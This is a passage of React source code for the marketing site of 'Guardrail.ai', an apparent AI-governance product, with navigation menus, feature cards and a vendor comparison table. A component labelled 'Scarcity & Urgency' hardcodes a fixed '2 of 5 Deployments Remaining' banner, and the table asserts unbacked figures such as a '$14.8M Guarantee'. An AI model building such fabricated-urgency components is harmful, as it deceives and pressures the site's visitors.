        { label: 'Education', href: '/solutions/education', tag: 'FERPA' },
        { label: 'Enterprise', href: '/solutions/enterprise', tag: 'SOC2' },
    ];
    return (
        <nav className="flex gap-4 flex-wrap px-8 lg:px-16 py-5 border-b border-white/5 bg-black/60 backdrop-blur-md sticky top-20 z-50"
            aria-label="Domain solutions navigation">
            {links.map(l => (
                <a
                    key={l.href}
                    href={l.href}
                    aria-current={active === l.href ? 'page' : undefined}
                    className={`flex items-center gap-2 px-5 py-3 border text-[10px] font-black uppercase tracking-widest transition-all ${active === l.href ? 'border-emerald-500 bg-emerald-500/10 text-emerald-400' : 'border-white/10 opacity-50 hover:opacity-100 hover:border-white/20'}`}
                >
                    {l.label}
                    <span className="text-[7px] opacity-30">{l.tag}</span>
                </a>
            ))}
        </nav>
    );
};

// GlobalNavV2 — updated nav with Solutions dropdown
export const GlobalNavV2 = () => {
    const [solutionsOpen, setSolutionsOpen] = useState(false);
    return (
        <nav className="fixed top-0 left-64 right-0 h-20 bg-black/80 backdrop-blur-md border-b border-white/10 z-[100] px-12 flex items-center justify-between">
            <div className="flex items-center gap-10">
                <motion.a whileHover={{ scale: 1.05 }} href="/" className="flex flex-col group">
                    <span className="text-[10px] font-black uppercase tracking-[0.4em] text-white/40 group-hover:text-emerald-400 transition-colors">01 // Vision</span>
                    <span className="text-xs font-black italic uppercase leading-tight group-hover:text-white transition-colors">Sovereign Home</span>
                </motion.a>
                <motion.a whileHover={{ scale: 1.05 }} href="/platform" className="flex flex-col group">
                    <span className="text-[10px] font-black uppercase tracking-[0.4em] text-white/40 group-hover:text-emerald-400 transition-colors">02 // Platform</span>
                    <span className="text-xs font-black italic uppercase leading-tight group-hover:text-white transition-colors">Technical Hub</span>
                </motion.a>
                <motion.a whileHover={{ scale: 1.05 }} href="/governance" className="flex flex-col group">
                    <span className="text-[10px] font-black uppercase tracking-[0.4em] text-white/40 group-hover:text-emerald-400 transition-colors">03 // Governance</span>
                    <span className="text-xs font-black italic uppercase leading-tight group-hover:text-white transition-colors">War Room</span>
                </motion.a>
                <div className="relative" onMouseEnter={() => setSolutionsOpen(true)} onMouseLeave={() => setSolutionsOpen(false)}>
                    <motion.button whileHover={{ scale: 1.05 }} className="flex flex-col group text-left">
                        <span className="text-[10px] font-black uppercase tracking-[0.4em] text-white/40 group-hover:text-emerald-400 transition-colors flex items-center gap-1">
                            04 // Solutions <ChevronDown size={8} />
                        </span>
                        <span className="text-xs font-black italic uppercase leading-tight group-hover:text-white transition-colors">Human-Centric</span>
                    </motion.button>
                    <AnimatePresence>
                        {solutionsOpen && (
                            <motion.div
                                initial={{ opacity: 0, y: 8 }}
                                animate={{ opacity: 1, y: 0 }}
                                exit={{ opacity: 0, y: 8 }}
                                className="absolute top-full left-0 mt-2 bg-black border border-white/10 shadow-2xl min-w-[220px] py-2"
                                role="menu"
                            >
                                {[
                                    { label: 'Healthcare', href: '/solutions/healthcare', tag: 'HIPAA' },
                                    { label: 'Finance', href: '/solutions/finance', tag: 'SEC / BaFin' },
                                    { label: 'Education', href: '/solutions/education', tag: 'FERPA' },
                                    { label: 'Enterprise', href: '/solutions/enterprise', tag: 'SOC2' },
                                ].map(item => (
                                    <a key={item.href} href={item.href} role="menuitem"
                                        className="flex justify-between items-center px-6 py-4 hover:bg-emerald-500/5 hover:text-emerald-400 transition-all group"
                                    >
                                        <span className="text-[10px] font-black uppercase tracking-widest">{item.label}</span>
                                        <span className="text-[8px] font-black uppercase opacity-30 group-hover:opacity-60">{item.tag}</span>
                                    </a>
                                ))}
                            </motion.div>
                        )}
                    </AnimatePresence>
                </div>
            </div>
            <div className="flex items-center gap-8">
                <div className="flex flex-col items-end">
                    <span className="text-[8px] font-black uppercase tracking-widest text-emerald-400 flex items-center gap-2">
                        <Activity size={8} /> Mesh State: Synchronized
                    </span>
                    <span className="text-[8px] font-black opacity-30 mt-1 uppercase tracking-tighter">L1 Hardware Attested // EFI-LOCKED</span>
                </div>
                <motion.button
                    whileHover={{ scale: 1.1 }}
                    whileTap={{ scale: 0.95 }}
                    className="p-3 border border-white/10 hover:border-emerald-500/40 transition-all bg-white/5"
                    aria-label="Mesh shield status"
                >
                    <Shield size={16} strokeWidth={1.5} className="text-emerald-400" />
                </motion.button>
            </div>
        </nav>
    );
};

/* --- PSYCHOLOGY-BACKED DESIGN COMPONENTS --- */

// 1. FPatternTechGrid (Cognitive Load Reduction)
export const FPatternTechGrid = () => {
    return (
        <div className="flex flex-col gap-6 max-w-4xl font-mono text-sm border-l-2 border-emerald-500/30 pl-6 my-12">
            <div className="flex flex-col gap-2">
                <h4 className="text-emerald-400 font-black tracking-widest uppercase mb-2">Systemic Architecture</h4>
                <p className="opacity-80 leading-relaxed mb-4">Guardrail.ai operates at the infrastructure layer, validating every agentic action against a post-quantum verifiable ledger before execution. This eliminates drift before it becomes liability.</p>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="glass-morphism p-4 border border-white/5 hover:border-emerald-500/30 transition-colors">
                    <span className="text-emerald-400 text-xs font-bold block mb-2 uppercase tracking-wider">Hardware Anchoring</span>
                    <span className="opacity-60 text-xs">TPM-backed identity for all autonomous agents.</span>
                </div>
                <div className="glass-morphism p-4 border border-white/5 hover:border-emerald-500/30 transition-colors">
                    <span className="text-emerald-400 text-xs font-bold block mb-2 uppercase tracking-wider">Trinity Consensus</span>
                    <span className="opacity-60 text-xs">Multi-model vetting (3-of-3) required for sensitive actions.</span>
                </div>
                <div className="glass-morphism p-4 border border-white/5 md:col-span-2 hover:border-emerald-500/30 transition-colors">
                    <span className="text-emerald-400 text-xs font-bold block mb-2 uppercase tracking-wider">Absolute Finality</span>
                    <span className="opacity-60 text-xs">WORM-compliant audit logging for every atomic decision, cryptographically signed.</span>
                </div>
            </div>
        </div>
    );
};

// 2. ProgressiveDisclosureCard (Cognitive Load Reduction)
export const ProgressiveDisclosureCard = ({ title, summary, details }: { title: string, summary: string, details: React.ReactNode }) => {
    const [isOpen, setIsOpen] = useState(false);

    return (
        <div className="border border-white/10 p-6 glass-morphism hover:border-emerald-500/30 transition-all flex flex-col gap-4">
            <div className="flex justify-between items-start cursor-pointer" onClick={() => setIsOpen(!isOpen)}>
                <div className="flex flex-col gap-1">
                    <h4 className="font-black text-white uppercase tracking-wider">{title}</h4>
                    <span className="text-xs opacity-60 font-mono">{summary}</span>
                </div>
                <button className="text-emerald-400 opacity-60 hover:opacity-100 transition-opacity">
                    {isOpen ? <ChevronUp size={20} /> : <ChevronDown size={20} />}
                </button>
            </div>

            <AnimatePresence>
                {isOpen && (
                    <motion.div
                        initial={{ height: 0, opacity: 0 }}
                        animate={{ height: 'auto', opacity: 1 }}
                        exit={{ height: 0, opacity: 0 }}
                        className="overflow-hidden"
                    >
                        <div className="pt-4 border-t border-white/10 mt-2 font-mono text-xs opacity-80 text-emerald-400 bg-black/50 p-4 rounded whitespace-pre-wrap">
                            {details}
                        </div>
                    </motion.div>
                )}
            </AnimatePresence>
        </div>
    );
};

// 3. DeterministicReassuranceOverlay (Anxiety Reduction)
export const DeterministicReassuranceOverlay = ({ children, message }: { children: React.ReactNode, message: string }) => {
    return (
        <div className="relative group inline-block">
            {children}
            <div className="absolute top-full left-1/2 -translate-x-1/2 mt-2 w-max max-w-xs p-3 bg-black border border-emerald-500/50 shadow-[0_0_15px_rgba(0,255,136,0.1)] opacity-0 pointer-events-none group-hover:opacity-100 transition-opacity z-50 rounded">
                <div className="flex items-start gap-2">
                    <Shield size={14} className="text-emerald-400 shrink-0 mt-0.5" />
                    <span className="text-[10px] font-mono leading-tight text-white/80">{message}</span>
                </div>
            </div>
        </div>
    );
};

// 4. VendorComparisonMatrix (Decision Support)
export const VendorComparisonMatrix = () => {
    return (
        <section className="py-24 border-y border-white/5 my-24 relative overflow-hidden">
            <div className="max-w-5xl mx-auto flex flex-col gap-12">
                <div className="flex flex-col gap-4">
                    <h2 className="text-3xl font-black italic uppercase text-white">The Sovereign Standard</h2>
                    <ExecutiveSubtitle text="Comparing Guardrail.ai against legacy approaches." />
                </div>

                <div className="overflow-x-auto custom-scrollbar">
                    <table className="w-full text-left font-mono border-collapse min-w-[800px]">
                        <thead>
                            <tr className="border-b-2 border-white/20">
                                <th className="p-4 text-xs font-black opacity-60 uppercase w-1/4">Capability</th>
                                <th className="p-4 text-xs font-black opacity-60 uppercase w-1/4">Manual Audits</th>
                                <th className="p-4 text-xs font-black opacity-60 uppercase w-1/4">Generic LLM Wrappers</th>
                                <th className="p-4 text-sm font-black text-emerald-400 uppercase w-1/4 bg-emerald-500/5">Guardrail.ai Layer 1</th>
                            </tr>
                        </thead>
                        <tbody className="text-sm">
                            <tr className="border-b border-white/5 hover:bg-white/5 transition-colors">
                                <td className="p-4 opacity-80">Latency / Intercept</td>
                                <td className="p-4 text-red-400 text-xs font-bold">Days (Reactive)</td>
                                <td className="p-4 text-amber-400 text-xs font-bold">500ms+ (Software)</td>
                                <td className="p-4 text-emerald-400 font-bold bg-emerald-500/5 text-xs">{"< 2ms (Hardware)"}</td>
                            </tr>
                            <tr className="border-b border-white/5 hover:bg-white/5 transition-colors">
                                <td className="p-4 opacity-80">Liability Shift</td>
                                <td className="p-4 text-red-400 text-xs font-bold">None</td>
                                <td className="p-4 text-red-400 text-xs font-bold">None</td>
                                <td className="p-4 text-emerald-400 font-bold bg-emerald-500/5 text-xs">$14.8M Guarantee</td>
                            </tr>
                            <tr className="border-b border-white/5 hover:bg-white/5 transition-colors">
                                <td className="p-4 opacity-80">Truth Storage</td>
                                <td className="p-4 text-amber-400 text-xs font-bold">PDF Reports</td>
                                <td className="p-4 text-amber-400 text-xs font-bold">Standard DB (Mutable)</td>
                                <td className="p-4 text-emerald-400 font-bold bg-emerald-500/5 text-xs">WORM Crypto-Archive</td>
                            </tr>
                            <tr className="hover:bg-white/5 transition-colors">
                                <td className="p-4 opacity-80">Validation Logic</td>
                                <td className="p-4 text-amber-400 text-xs font-bold">Human Review</td>
                                <td className="p-4 text-amber-400 text-xs font-bold">Self-Checking (Bias)</td>
                                <td className="p-4 text-emerald-400 font-bold bg-emerald-500/5 text-xs">Trinity Consensus</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
            <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-[300px] bg-emerald-500/5 blur-[120px] pointer-events-none -z-10" />
        </section>
    );
};

// 5. SovereignPilotBanner (Scarcity & Urgency)
export const SovereignPilotBanner = () => {
    return (
        <div className="w-full bg-emerald-500 text-black py-2 px-4 flex justify-center items-center gap-4 text-[10px] font-black uppercase tracking-widest sticky top-0 z-50 shadow-[0_4px_20px_rgba(0,255,136,0.15)] overflow-hidden">
            <motion.div
                animate={{ x: [-1000, 1000] }}
                transition={{ repeat: Infinity, duration: 8, ease: "linear" }}
                className="absolute w-32 h-full bg-white/30 -skew-x-12 blur-[4px]"
            />
            <div className="flex items-center gap-2 relative z-10">
                <ShieldAlert size={14} className="shrink-0" />
                <span>Q3 Enterprise Capacity Limit:</span>
                <span className="bg-black text-emerald-400 px-2 py-0.5 rounded-sm">2 of 5 Deployments Remaining</span>
            </div>
            <div className="hidden md:flex items-center gap-2 opacity-60 relative z-10">
                <span>|</span>
                <span>Hardware allocation prioritized for critical infrastructure</span>
            </div>
        </div>
    );
};
